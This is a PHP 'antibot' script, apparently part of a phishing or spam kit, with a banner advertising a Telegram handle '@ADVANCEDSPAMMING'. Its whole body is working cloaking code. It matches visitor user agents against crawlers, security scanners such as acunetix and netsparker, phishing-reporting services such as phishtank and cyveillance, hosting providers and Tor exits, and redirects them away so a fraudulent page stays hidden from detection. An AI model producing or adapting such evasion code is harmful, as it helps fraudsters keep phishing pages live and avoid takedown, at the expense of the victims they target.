<?php
/*  
````````````````````````````````````````````````````````````````````````````````
``````````````````````````````````CODER INFO````````````````````````````````````
````````````````````````````````````````````````````````````````````````````````
``````````````````````````TELEGRAM: @ADVANCEDSPAMMING```````````````````````````
````````````````````````````````````````````````````````````````````````````````
````````````````````````````````.-/+osyyyso+/-.`````````````````````````````````
``````````````````````````````:oyhhhhhhhhhhhhhyo:```````````````````````````````
````````````````````````````/yhhhhhhhhhhhhhhhhhhhy/`````````````````````````````
``````````````````````````.shhhhhhhhhhhhhhhhhhhhhhhs.```````````````````````````
`````````````````````````.yhhhhhhhhhhhhhhhhhhhhhhhhhy.``````````````````````````
`````````````````````````shhhhhhhhhhhhhhhhhhhhhhhhhhhs``````````````````````````
``````````````````+++++`-hhhhhhhhhhhhhhhhhhhhhhhhhhhhh-`+++++```````````````````
`````````````````.hhhhh`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh+`hhhhh.``````````````````
`````````````````.hhhy+`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh/`+yhhh.``````````````````
`````````````````.hhh+``.hhhhhhyo++shhhhhhhs++oshhhhhh-``+hhh.``````````````````
`````````````````.hhh+```+hhhy.`````/hhhhh+`````.shhho```+hhh.``````````````````
`````````````````.hhh+```.hhho``````/hhhhho``````/hhh.```+hhh.``````````````````
`````````````````.hhh+````hhhho::/+shhh+hhhyo/::ohhhh````+hhh.``````````````````
`````````````````.hhh+```+hhhhhhhhhhhh+`/hhhhhhhhhhhh+```+hhh.``````````````````
`````````````````.hhh+```-shhhhhhhhhhs```ohhhhhhhhhhs-```+hhh.``````````````````
`````````````````.hhh+`````-ohhyhhhhhhhhhhhhhhhyhho-`````+hhh.``````````````````
`````````````````.hhh+``````````.yhhhhhhhhhhhy.``````````+hhh.``````````````````
`````````````````.hhh+```````````ohhhhhhhhhhho```````````+hhh.``````````````````
`````````````````.hhh+```````````+yhhhhhhhhhy+```````````+hhh.``````````````````
`````````````````.hhh+````````````....---....````````````+hhh.``````````````````
`````````````````.hhhyoooooooooooooooooooooooooooooooooooyhhh.``````````````````
`````````````````.yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy.``````````````````
```````````.::::::///////////////.............///////////////::::::.````````````
```````````:hhhhhhhhhhhhhhhhhhhhho///////////ohhhhhhhhhhhhhhhhhhhhh/````````````
````````````/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy/`````````````
`````````````.....................................................``````````````
````````````````````````````````````````````````````````````````````````````````
*/
if ( isset( $_SERVER['HTTP_USER_AGENT'] ) && preg_match( '/bot|crawl|slurp|spider|Dr.Web|hostinger|scanurl|above|google|facebook|softlayer|amazonaws|cyveillance|phishtank|dreamhost|netpilot|calyxinstitute|tor-exit|drweb/i' , $_SERVER['HTTP_USER_AGENT'] ) ) { 
        header( "HTTP/1.1 301 Moved Permanently" );
        header( "location: " . $antibot['redirect_url'] ); 
        exit(); }

        
if ( strpos( $_SERVER['HTTP_USER_AGENT'], 'google'             ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'msnbot'             ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp'       ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'YahooSeeker'        ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'Googlebot'          ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'bingbot'            ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'crawler'            ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'PycURL'             ) or 
     strpos( $_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { 
        header( "HTTP/1.1 301 Moved Permanently" );
        header( "location: " . $antibot['redirect_url'] ); 
        exit();}


$user_agent_lowercase =  strtolower( $_SERVER['HTTP_USER_AGENT'] );
$blacklist_user_agent = array(
                            "007ac9",
                            "008",
                            "192.comagent",
                            "200pleasebot",
                            "360spider",
                            "4seohuntbot",
                            "50.nu",
                            "a6-indexer",
                            "aboundexbot",
                            "aboutusbot",
                            "above",
                            "abrave spider",
                            "accelobot",
                            "acoonbot",
                            "acunetix",
                            "addthis.com",
                            "admantx",
                            "adsbot-google",
                            "ahrefsbot",
                            "alexabot",
                            "amagit.com",
                            "amazonaws",
                            "amznkassocbot",
                            "analytics",
                            "antbot",
                            "apache-httpclient",
                            "apercite",
                            "aportworm",
                            "arabot",
                            "bot",
                            "calyxinstitute",
                            "CL0NA",
                            "crawler",
                            "cyveillance",
                            "dreamhost",
                            "EBAY",
                            "ebay",
                            "google",
                            "hotmail!",
                            "hotmail",
                            "jabber",
                            "jetbrains",
                            "lssrocketcrawler",
                            "msn!",
                            "msn",
                            "msnbot",
                            "netpilot",
                            "netsparker",
                            "outlook!",
                            "outlook",
                            "phishtank",
                            "softlayer",
                            "spam",
                            "tor-exit",
                            "urlredirectresolver",
                            "windows 95",
                            "windows 98", );

foreach( $blacklist_user_agent as $blacklisted_user_agent ) {
    if ( substr_count( $user_agent_lowercase, strtolower( $blacklisted_user_agent ) ) > 0 or
         $user_agent_lowercase == ""                                                      or 
         $user_agent_lowercase == " "                                                     or 
         $user_agent_lowercase == "	" ) {
                header( "HTTP/1.1 301 Moved Permanently" );
                header( "location: " . $antibot['redirect_url'] ); 
                exit();
    }  
}
?>